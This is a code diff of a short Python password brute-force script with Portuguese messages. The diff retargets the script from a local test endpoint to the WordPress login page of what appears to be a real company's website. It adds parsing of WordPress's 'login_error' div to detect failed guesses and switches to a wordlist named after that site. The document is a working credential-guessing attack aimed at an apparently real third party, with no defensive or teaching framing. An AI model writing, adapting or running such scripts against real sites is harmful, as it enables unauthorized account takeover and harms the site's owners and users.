@@ -1,8 +1,9 @@
 import requests
 import sys
 import time
+from bs4 import BeautifulSoup
 
-url = "http://127.0.0.1:3001/api/login"
+url = "https://www.gtfoods.com.br/wp-login.php"
 username = input("Enter the username: ")
 error = input("Enter the login failed string: ")
 
@@ -30,8 +31,10 @@ try:
             
             try:
                 res = requests.post(url, data=data_dict)
+                soup = BeautifulSoup(res.content, 'html.parser')
+                div_login_error = soup.find("div", id="login_error")
 
-                if error in res.content.decode():
+                if div_login_error:
                     pass
                 else:
                     print("\033[1;32m"+"[+] senha encontrada --> " + password)
@@ -43,5 +46,5 @@ try:
 
 except:
     print("\033[1;31m"+"[-] erro na conexão com o servidor")
-with open("passwords.txt", "r") as passwords:
+with open("gtfoods.txt", "r") as passwords:
     brute(username, url, error)
